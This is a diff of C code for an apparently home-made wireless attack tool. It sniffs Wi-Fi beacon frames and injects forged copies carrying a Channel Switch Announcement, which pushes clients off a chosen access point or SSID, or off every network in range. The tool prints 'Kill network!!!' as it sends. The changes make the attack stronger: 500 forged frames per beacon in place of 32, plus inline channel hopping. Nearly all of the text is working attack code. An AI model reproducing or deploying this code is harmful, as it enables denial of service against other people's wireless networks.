@@ -54,7 +54,7 @@ void Mac_(const char *arr, u_char mac_addr[6])
     }
     char cpyarr[18];
     memcpy(cpyarr, arr, 17);
-    for (int i = 0; i < 6; i++) //입력Mac값의 콜론 제거
+    for (int i = 0; i < 6; i++) // 입력Mac값의 콜론 제거
     {
         cpyarr[i * 3 + 2] = '\0';
         sscanf((const char *)&cpyarr[3 * i], "%x", &a);
@@ -79,19 +79,24 @@ bool isBeacon(const u_char *packet)
     }
 }
 
-bool isSSID(const u_char *packet, u_char caplen, unsigned char *ssid)
+bool isSSID(const u_char *packet, struct pcap_pkthdr* header, unsigned char *ssid)
 {
+    //printf("caplen == %d\n",header->caplen);
     int ssid_len = strlen(ssid);
     Radio *rad = (Radio *)packet;
     u_char *packet_ = (u_char *)(packet + rad->hdr_len + 24 + 12);
 
-    int taglen = caplen - rad->hdr_len - 12 - 24 - 4;
-
+    int taglen = header->caplen - rad->hdr_len - 12 - 24 - 4;
+    //printf("caplen : %d\n",caplen);
     for (int i = 0; i < taglen;)
     {
         Tag *tag = (Tag *)(packet_ + i);
         if (tag->tag_number == 0)
         {
+            // for (int i = 0; i < ssid_len; i++)
+            // {
+            //     printf("%c",*(packet_+2+i));
+            // }puts("");
             if (strncmp(ssid, packet_ + 2, ssid_len) == 0)
             {
                 return true;
@@ -140,18 +145,6 @@ void PtData(const u_char *packet, u_char caplen)
     printf("\n");
 }
 
-void *channel(void *Interface)
-{
-    int i = 0;
-    while (true)
-    {
-        myCh = Wireless_Channel[i];
-        i < 57 ? (i += 1) : (i = 0);
-        channel_hopping(Interface, (double)myCh);
-        // printf("mych : %d\n", myCh);
-        usleep(10000); // 1000000 = 1sec
-    }
-}
 
 int csaATK(const unsigned char *Input_STA_MAC, Opt *opt)
 {
@@ -172,20 +165,24 @@ int csaATK(const unsigned char *Input_STA_MAC, Opt *opt)
         start_time = time(NULL);
     }
     int packet_count = 0;
-    if (!Op_c)
-    {
-        if (threadErr = pthread_create(&channel_chg, NULL, channel, (void *)opt->Interface))
-        {
-            printf("Thread Err = %d\n", threadErr);
-        }
-    }
-    else{
-        channel_hopping(opt->Interface,opt->Op_f_ch);
-        myCh=opt->Op_f_ch;
-    }
+    int i = 0;
+    int captureC = 0;
     while (true)
     {
+        captureC++;
+        if (!Op_c)
+        {
 
+            myCh = Wireless_Channel[i];
+            i < 57 ? (i += 1) : (i = 0);
+            channel_hopping(opt->Interface, myCh);
+        }
+        else
+        {
+            channel_hopping(opt->Interface, opt->Op_f_ch);
+            myCh = opt->Op_f_ch;
+        }
+        //printf("Channel : [%d]\n",myCh);
         if (Op_t)
         {
             now_time = time(NULL);
@@ -208,7 +205,7 @@ int csaATK(const unsigned char *Input_STA_MAC, Opt *opt)
         }
         // PtData(packet,header->caplen);
 
-        //채널변경
+        // 채널변경
 
         // printf("mych : %d\n", myCh);
 
@@ -227,6 +224,7 @@ int csaATK(const unsigned char *Input_STA_MAC, Opt *opt)
             if (isBeacon(packet))
             {
                 /*----------이거 함수화----------*/
+                //printf("caplen : %d\n",header->caplen);
                 unsigned char csaCh;
                 srand(time(NULL));
 
@@ -255,7 +253,8 @@ int csaATK(const unsigned char *Input_STA_MAC, Opt *opt)
                 }
                 BeaconHd *becH;
                 becH = (BeaconHd *)(packet + rad->hdr_len);
-                if ((Op_a && arrncmp(AP_MAC, becH->mac_src, 6)) || (Op_s && isSSID(packet, header->caplen, opt->Input_SSID) || Op_x))
+                //printf("caplen : %d\n",header->caplen);
+                if ((Op_a && arrncmp(AP_MAC, becH->mac_src, 6)) || (Op_s && isSSID(packet, header, opt->Input_SSID) || Op_x))
                 {
                     send_packet = (u_char *)malloc(sizeof(u_char) * (header->caplen));
                     if (send_packet == NULL)
@@ -328,11 +327,16 @@ int csaATK(const unsigned char *Input_STA_MAC, Opt *opt)
                         *(send_packet + header->caplen + 3) = csaCh;
                         *(send_packet + header->caplen + 4) = 0x1;
                     }
-                    for (int i = 0; i < 4 * 8; i++)
+                    bool Ds = false;
+                    for (int i = 0; i < 500; i++)
                     {
                         if (i == 0)
                         {
-                            if(ApCh!=myCh){channel_hopping(opt->Interface, ApCh);}
+                            if (ApCh != myCh)
+                            {
+                                channel_hopping(opt->Interface, ApCh);
+                                Ds = true;
+                            } // Ds 있어서 채널변경하고 전송했으면 다시 원래 채널로 바꾸기 추가하자
                             printf("[%d] [ch:%d] [%d]->[%d] SSID : ", ++packet_count, myCh, ApCh, csaCh);
                             for (int i = 0; i < ssid_len; i++)
                             {
@@ -340,11 +344,16 @@ int csaATK(const unsigned char *Input_STA_MAC, Opt *opt)
                             }
                             puts(" Kill network!!!");
                         }
+
                         if (pcap_sendpacket(pcap, send_packet, total_len) != 0)
                         {
                             fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pcap));
                             return -1;
                         }
+                    }
+                    if (Ds)
+                    {
+                        channel_hopping(opt->Interface, myCh);
                     }
 
                     free(send_packet);
@@ -352,6 +361,11 @@ int csaATK(const unsigned char *Input_STA_MAC, Opt *opt)
             }
             else
             {
+                if (captureC % 8 == 0)
+                {
+                    i++;
+                }
+
                 continue;
             }
         }
